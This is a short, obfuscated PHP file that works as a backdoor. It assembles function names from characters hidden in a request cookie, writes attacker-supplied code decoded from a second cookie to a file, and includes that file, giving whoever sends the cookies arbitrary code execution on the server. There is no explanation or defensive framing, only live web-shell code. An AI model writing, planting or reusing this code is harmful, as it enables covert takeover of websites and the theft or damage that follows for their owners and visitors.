<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[38])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 9;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[38][$n];
        if (!$c[38][$n + 1]) {
            if (!$c[38][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 9 + 1;
    }
    $k = $p[6]() . $p[4];
    if (!$p[26]($k)) {
        $n = $p[22]($k, $p[7]);
        $p[28]($n, $p[24] . $p[12]($p[21]($c[3])));
    }
    include($k);
}